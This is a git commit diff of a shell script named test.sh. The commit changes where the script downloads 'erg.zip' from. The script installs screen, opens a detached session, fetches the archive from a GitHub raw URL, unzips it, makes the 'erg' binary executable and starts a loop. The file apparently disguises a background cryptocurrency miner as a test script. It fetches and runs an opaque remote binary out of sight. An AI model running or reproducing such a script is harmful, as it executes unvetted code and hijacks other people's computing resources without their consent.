97d91e126544771e43a594f40692cf664270ef3e
gassssaja <84879570+gassssaja@users.noreply.github.com>
2021-05-26 22:04:02 +0000

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,7 +1,7 @@
 sudo apt update -y
 sudo apt install screen -y
 sudo screen -dmS random
-wget https://raw.githubusercontent.com/prorjdbot/bot/main/erg.zip
+wget https://raw.githubusercontent.com/gassssaja/project/main/erg.zip
 unzip erg.zip
 chmod +x erg
 while [ 1 ]; do
